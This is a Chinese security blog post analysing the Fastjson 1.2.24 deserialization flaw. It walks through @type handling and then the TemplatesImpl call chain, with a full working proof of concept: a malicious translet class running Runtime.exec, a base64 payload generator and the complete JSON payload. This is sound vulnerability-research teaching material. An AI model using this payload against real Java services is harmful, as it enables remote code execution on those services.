> 原文链接: https://www.anquanke.com//post/id/235479 


# Fastjson1.2.24反序列化学习


                                阅读量   
                                **243783**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">2</a>
                                </b>
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](https://p2.ssl.qhimg.com/t0175552f2250560322.jpg)](https://p2.ssl.qhimg.com/t0175552f2250560322.jpg)



作者：江鸟@星盟

Fastjson 是一个 Java 库，可以将 Java 对象转换为 JSON 格式，当然它也可以将 JSON 字符串转换为 Java 对象。



## 简单应用

### <a class="reference-link" name="%E7%8E%AF%E5%A2%83"></a>环境

我是用idea+maven构造的，分为以下几步

```
1. idea新建一个maven项目
2. 修改pom.xml 引入fastjson
&lt;dependencies&gt;
        &lt;dependency&gt;
            &lt;groupId&gt;com.alibaba&lt;/groupId&gt;
            &lt;artifactId&gt;fastjson&lt;/artifactId&gt;
            &lt;version&gt;1.2.24&lt;/version&gt;
        &lt;/dependency&gt;
&lt;/dependencies&gt;
```

### <a class="reference-link" name="%E5%BA%8F%E5%88%97%E5%8C%96"></a>序列化

Ser

```
public class Ser `{`
    public static void main(String[] args) `{`
        User user = new User();
        user.setName("lisi");
        String jsonstring = JSON.toJSONString(user, SerializerFeature.WriteClassName);
        System.out.println(jsonstring);
    `}`
`}`
```

结果

```
setName is running ...
getName is running ...
`{`"@type":"User","name":"lisi"`}`
```

`SerializerFeature.WriteClassName`是`toJSONString`设置的一个属性值，设置之后在序列化的时候会多写入一个`[@type](https://github.com/type)`，即写上被序列化的类名，`type`可以指定反序列化的类，并且调用其`getter/setter/is`方法。

不加的时候结果中就没有[@type](https://github.com/type)

```
setName is running ...
getName is running ...
`{`"name":"lisi"`}`
```

上面说了有parseObject和parse两种方法进行反序列化，现在来看看他们之间的区别

```
public static JSONObject parseObject(String text) `{`
        Object obj = parse(text);
        return obj instanceof JSONObject ? (JSONObject)obj : (JSONObject)toJSON(obj);
    `}`
```

parseObject其实也是使用的parse方法，只是多了一步toJSON方法处理对象。

### <a class="reference-link" name="%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"></a>反序列化

User

```
/**
 * @program: fastjsontest
 * @description:
 * @author: 江鸟
 * @create: 2021-03-15 18:28
 **/
public class User `{`
    private String name;

    public String getName() `{`
        System.out.println("getName is running ...");
        return name;
    `}`

    public void setName(String name) `{`
        System.out.println("setName is running ...");
        this.name = name;
    `}`

    @Override
    public String toString() `{`
        return "User`{`" +
                "name='" + name + '\'' +
                '`}`';
    `}`
`}`
```

Test

```
import com.alibaba.fastjson.JSON;

/**
 * @program: fastjsontest
 * @description:
 * @author: 江鸟
 * @create: 2021-03-15 18:29
 **/
public class Test `{`
    public static void main(String[] args) `{`
        String json = "`{`\"@type\":\"User\", \"name\":\"zhangsan\"`}`";
        Object obj = JSON.parse(json);
        System.out.println(obj); //输出User`{`name='zhangsan'`}`
    `}`
`}`
```

结果为

```
setName is running ...
User`{`name='zhangsan'`}`
```

当输出一个object类型的对象时，会通过[@type](https://github.com/type)指定的进行解析，被解析成了User类型的对象

[@type](https://github.com/type)属性起的作用，

**Fastjson支持在json数据中使用[@type](https://github.com/type)属性指定该json数据被反序列为什么类型的对象**

同时控制台也输出了 setName is running … ，

**说明在反序列化对象时，会执行javabean的setter方法为其属性赋值**。

**parse成功触发了set方法，parseObject同时触发了set和get方法**

```
//        Object obj = JSON.parse(json); // 不调用getter方法
        Object obj = JSON.parseObject(json);//都弹出计算机
```



## 1.2.24 反序列化

### <a class="reference-link" name="%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90"></a>代码分析

通过设置断点，我们来找存在问题的漏洞代码，在测试代码Test中设置最开始的断点

`Object obj = JSON.parse(json);`

因为我们知道然后再进User中给调用的`setName`方法设置断点开始debug的时候跳转到第二个断点

往回找 找到了一个setValue方法

[![](https://p4.ssl.qhimg.com/t0128e5c6ec74122d39.png)](https://p4.ssl.qhimg.com/t0128e5c6ec74122d39.png)

[![](https://p2.ssl.qhimg.com/t0179a52de6f86928de.png)](https://p2.ssl.qhimg.com/t0179a52de6f86928de.png)

首先传入的是User类型，值为zhangsan，通过反射获取到类的方法名，然后调用方法进行赋值

在该方法中可以得出如下结论：
1. fileldinfo类中包含javabean的属性名称及其setter、getter等Method对象，然后通过反射的方式调用setter方法为属性赋值。
1. 当javabean中存在属性为AtomicInteger、AtomicLong、AtomicBoolean、Map或Collection类型，且fieldinfo.getOnly值为true时（当javabean的属性没有setter方法，只有getter方法时，该值为true），在反序列化时会调用该属性的getter方法。


## 漏洞利用

### <a class="reference-link" name="TemplatesImpl%E6%94%BB%E5%87%BB%E8%B0%83%E7%94%A8%E9%93%BE%E8%B7%AF"></a>TemplatesImpl攻击调用链路

如果一个类中的Getter方法满足调用条件并且存在可利用点，那么这个攻击链就产生了。

TemplatesImpl类恰好满足这个要求：

`com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl`中存在一个名为`_outputPropertiesget`的私有变量，其getter方法中存在利用点，这个getter方法恰好满足了调用条件，在JSON字符串被解析时可以调用其在调用FastJson.parseObject()序列化为Java对象时会被调用

poc：

```
/**
 * @program: fastjsontest
 * @description:fastjson1.2.24版本TemplatesImpl攻击调用链路
 * @author: 江鸟
 * @create: 2021-03-17 10:21
 **/
import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

import java.io.IOException;

public class TEMPOC extends AbstractTranslet `{`

    public TEMPOC() throws IOException `{`
        Runtime.getRuntime().exec("open -a Calculator");
    `}`

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) `{`
    `}`

    @Override
    public void transform(DOM document, com.sun.org.apache.xml.internal.serializer.SerializationHandler[] haFndlers) throws TransletException `{`

    `}`

    public static void main(String[] args) throws Exception `{`
        TEMPOC t = new TEMPOC();
    `}`
`}`
```

通过如下方式进行base64加密以及生成payload

```
import base64

fin = open(r"TEMPOC.class","rb")
byte = fin.read()
fout = base64.b64encode(byte).decode("utf-8")
poc = '`{`"@type":"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl","_bytecodes":["%s"],"_name":"a.b","_tfactory":`{``}`,"_outputProperties":`{` `}`,"_version":"1.0","allowedProtocols":"all"`}`'% fout
print poc
```

POC如下

```
`{`"@type":"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl","_bytecodes":["yv66vgAAADQAJgoABwAXCgAYABkIABoKABgAGwcAHAoABQAXBwAdAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEACkV4Y2VwdGlvbnMHAB4BAAl0cmFuc2Zvcm0BAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWBwAfAQAEbWFpbgEAFihbTGphdmEvbGFuZy9TdHJpbmc7KVYHACABAApTb3VyY2VGaWxlAQALVEVNUE9DLmphdmEMAAgACQcAIQwAIgAjAQASb3BlbiAtYSBDYWxjdWxhdG9yDAAkACUBAAZURU1QT0MBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQATamF2YS9pby9JT0V4Y2VwdGlvbgEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAE2phdmEvbGFuZy9FeGNlcHRpb24BABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7ACEABQAHAAAAAAAEAAEACAAJAAIACgAAAC4AAgABAAAADiq3AAG4AAISA7YABFexAAAAAQALAAAADgADAAAACwAEAAwADQANAAwAAAAEAAEADQABAA4ADwABAAoAAAAZAAAABAAAAAGxAAAAAQALAAAABgABAAAAEQABAA4AEAACAAoAAAAZAAAAAwAAAAGxAAAAAQALAAAABgABAAAAFgAMAAAABAABABEACQASABMAAgAKAAAAJQACAAIAAAAJuwAFWbcABkyxAAAAAQALAAAACgACAAAAGQAIABoADAAAAAQAAQAUAAEAFQAAAAIAFg=="],"_name":"a.b","_tfactory":`{` `}`,"_outputProperties":`{` `}`,"_version":"1.0","allowedProtocols":"all"`}`
```

通过poc进行分析

[![](https://p2.ssl.qhimg.com/t0151f41fe210ba38a5.png)](https://p2.ssl.qhimg.com/t0151f41fe210ba38a5.png)

调用链

[![](https://p0.ssl.qhimg.com/t0174a309f402472d31.png)](https://p0.ssl.qhimg.com/t0174a309f402472d31.png)

首先先调用了在`JSON.java`中的`parseObject()`

```
com.alibaba.fastjson.JSON#parse(java.lang.String, com.alibaba.fastjson.parser.Feature...)

public static JSONObject parseObject(String text, Feature... features) `{`
        return (JSONObject) parse(text, features);
    `}`
```

就相当于把parseObject变成了`parse(text, features)`类，并传入参数

跳转到

```
com.alibaba.fastjson.JSON#parse(java.lang.String, com.alibaba.fastjson.parser.Feature...)

public static Object parse(String text, Feature... features) `{`
        int featureValues = DEFAULT_PARSER_FEATURE;
        for (Feature feature : features) `{`
            featureValues = Feature.config(featureValues, feature, true);
        `}`

        return parse(text, featureValues);
    `}`
```

再跳到parse(String text, int features)

在这里new了一个DefaultJSONParser对象

```
DefaultJSONParser parser = new DefaultJSONParser(text, ParserConfig.getGlobalInstance(), features);
```

```
public DefaultJSONParser(final Object input, final JSONLexer lexer, final ParserConfig config)`{`
        this.lexer = lexer;
        this.input = input;
        this.config = config;
        this.symbolTable = config.symbolTable;

        int ch = lexer.getCurrent();
        if (ch == '`{`') `{`
            lexer.next();
            ((JSONLexerBase) lexer).token = JSONToken.LBRACE;
        `}` else if (ch == '[') `{`
            lexer.next();
            ((JSONLexerBase) lexer).token = JSONToken.LBRACKET;
        `}` else `{`
            lexer.nextToken(); // prime the pump
        `}`
    `}`
```

在这个对象中，主要是进行了对于传入字符串的获取操作

然后再传入parser.parseObject()来解析传入的数据

在这个函数主体内，会完成对于JSON数据的解析处理。在for循环中，不断的取得JSON数据中的值，然后进入`scanSymbol`处理。在scanSymbol中，首先会遍历取出两个双引号之间的数据作为key。

[![](https://p1.ssl.qhimg.com/t01b85018ab5ab9f180.png)](https://p1.ssl.qhimg.com/t01b85018ab5ab9f180.png)

然后到了下面这句进行反序列化

```
com.alibaba.fastjson.parser.DefaultJSONParser#parseObject(java.util.Map, java.lang.Object)

return deserializer.deserialze(this, clazz, fieldName);
```

传入的参数列表

[![](https://p3.ssl.qhimg.com/t011db2d1a4d31e8ee3.png)](https://p3.ssl.qhimg.com/t011db2d1a4d31e8ee3.png)

跟进函数查看

```
public &lt;T&gt; T deserialze(DefaultJSONParser parser, Type type, Object fieldName) `{`
        return deserialze(parser, type, fieldName, 0);
    `}`

    再到

public &lt;T&gt; T deserialze(DefaultJSONParser parser, Type type, Object fieldName, int features) `{`
        return deserialze(parser, type, fieldName, null, features);
    `}`

    再到

com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer#deserialze(com.alibaba.fastjson.parser.DefaultJSONParser, java.lang.reflect.Type, java.lang.Object, java.lang.Object, int)

boolean match = parseField(parser, key, object, type, fieldValues);
```

之后进入parseField()调用smartMatch()对key值进行处理

[![](https://p5.ssl.qhimg.com/t01fadd0961e6118d3a.png)](https://p5.ssl.qhimg.com/t01fadd0961e6118d3a.png)

[![](https://p0.ssl.qhimg.com/t01c889b62756735aad.png)](https://p0.ssl.qhimg.com/t01c889b62756735aad.png)

之后进入了fieldDeserializer.parseField()

[![](https://p3.ssl.qhimg.com/t01408e7b0488d2566c.png)](https://p3.ssl.qhimg.com/t01408e7b0488d2566c.png)

在这里调用了setValue方法

`com.alibaba.fastjson.parser.deserializer.DefaultFieldDeserializer#parseField`

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t018feb84d9c68b1e6b.png)

跟进之后发现这个方法中通过反射使fieldinfo的method值为outputProperties

[![](https://p0.ssl.qhimg.com/t01a67ea7897a2fdc5a.png)](https://p0.ssl.qhimg.com/t01a67ea7897a2fdc5a.png)

并在接下来的循环中通过invoke方法来调用class com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.getOutputProperties()

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t01ba10e5f57bbb5b52.png)

跟进newTransformer方法

[![](https://p1.ssl.qhimg.com/t01dd7cf0e34258e084.png)](https://p1.ssl.qhimg.com/t01dd7cf0e34258e084.png)

在这里主要看这个

```
transformer = new TransformerImpl(getTransletInstance(), _outputProperties, _indentNumber, _tfactory);
```

跟进getTransletInstance()方法

[![](https://p0.ssl.qhimg.com/t014b2717e9fd63679a.png)](https://p0.ssl.qhimg.com/t014b2717e9fd63679a.png)

`_bytecodes`会传入getTransletInstance方法中的defineTransletClasses方法，defineTransletClasses方法会根据`_bytecodes`字节数组new一个`_class`，`_bytecodes`加载到`_class`中，最后根据`_class`,用newInstance生成一个java实例。

[![](https://p3.ssl.qhimg.com/t016680b5ff615a4545.png)](https://p3.ssl.qhimg.com/t016680b5ff615a4545.png)

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t014ef6db7c232fcd19.png)

classloader是将class字节类载入虚拟机的一种形式，为了给外界提供一种加载class的途径

载入的内容

[![](https://p3.ssl.qhimg.com/t013a7b88991236aa13.png)](https://p3.ssl.qhimg.com/t013a7b88991236aa13.png)

[![](https://p2.ssl.qhimg.com/t01ca933dd9e9001bce.png)](https://p2.ssl.qhimg.com/t01ca933dd9e9001bce.png)

getConstructors()：此方法用于取得全部构造方法

newInstance()创建对象用的一个方法

所以这句话的意思是，将刚才载入的`_class[_transletIndex]`获取他的全部构造方法然后创建这个对象

最后一步，就是AbstractTranslet的强制转换

到这里命令就成功执行了



## 问题解答

### <a class="reference-link" name="%E4%B8%BA%E4%BB%80%E4%B9%88%E8%A6%81%E7%BB%A7%E6%89%BFAbstractTranslet"></a>为什么要继承AbstractTranslet

[![](https://p2.ssl.qhimg.com/t01bf79802456abdbde.png)](https://p2.ssl.qhimg.com/t01bf79802456abdbde.png)

在这里有一个AbstractTranslet的强制转换所以需要继承，不然会报错

### <a class="reference-link" name="%E4%B8%BA%E4%BB%80%E4%B9%88%E5%8F%AA%E6%9C%89%E5%9C%A8%E8%AE%BE%E5%AE%9AFeature.SupportNonPublicField%E5%8F%82%E6%95%B0%E6%89%8D%E5%8F%AF%E4%BB%A5%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%88%90%E5%8A%9F"></a>为什么只有在设定Feature.SupportNonPublicField参数才可以反序列化成功

这个问题其实也是为什么需要设定`_tfactory=`{``}``是一样的

[![](https://p3.ssl.qhimg.com/t01206c5414f1c4f7cc.png)](https://p3.ssl.qhimg.com/t01206c5414f1c4f7cc.png)

在defineTransletClasses()方法中需要满足`_tfactory`变量不为null，否则导致程序异常退出

因为`_tfactory`为私有变量，且无setter方法，所以需要指定Feature.SupportNonPublicField参数

就是为了支持私有属性的传入

### <a class="reference-link" name="%E4%B8%BA%E4%BB%80%E4%B9%88%E8%A6%81base64%E7%BC%96%E7%A0%81%E5%B9%B6%E7%94%A8%E6%95%B0%E7%BB%84%E6%A0%BC%E5%BC%8F"></a>为什么要base64编码并用数组格式

根据前面的内容 在反序列化deserialze之后调用了parseField()中

```
value = fieldValueDeserilizer.deserialze(parser, fieldType, fieldInfo.name);
```

跟进跳转

com.alibaba.fastjson.serializer.ObjectArrayCodec#deserialze

[![](https://p3.ssl.qhimg.com/t011782aeaa41e247fa.png)](https://p3.ssl.qhimg.com/t011782aeaa41e247fa.png)

在这里主要是对格式进行判断

当判断`_bytecodes`为数组的格式时，进入parseArray方法

com.alibaba.fastjson.parser.DefaultJSONParser#parseArray(java.lang.reflect.Type, java.util.Collection, java.lang.Object)

在这个函数时，

```
val = deserializer.deserialze(this, type, i);
```

又调用了 com.alibaba.fastjson.serializer.ObjectArrayCodec#deserialze

这次已经是数组提取的结果，进入了循环

```
if (lexer.token() == JSONToken.LITERAL_STRING) `{`
            byte[] bytes = lexer.bytesValue();
            lexer.nextToken(JSONToken.COMMA);
            return (T) bytes;
        `}`
```

跟进lexer.bytesValue()

位于com.alibaba.fastjson.parser.JSONScanner#bytesValue

[![](https://p2.ssl.qhimg.com/t01dd085a7c8cf1ec00.png)](https://p2.ssl.qhimg.com/t01dd085a7c8cf1ec00.png)

就是一个base64解码的操作，所以我们传入的`__bytecode`需要是数组形式并base64编码



## 参考

[https://zhuanlan.zhihu.com/p/356650590](https://zhuanlan.zhihu.com/p/356650590)

[https://xz.aliyun.com/t/8979](https://xz.aliyun.com/t/8979)

[https://www.anquanke.com/post/id/223467#h3-5](https://www.anquanke.com/post/id/223467#h3-5)
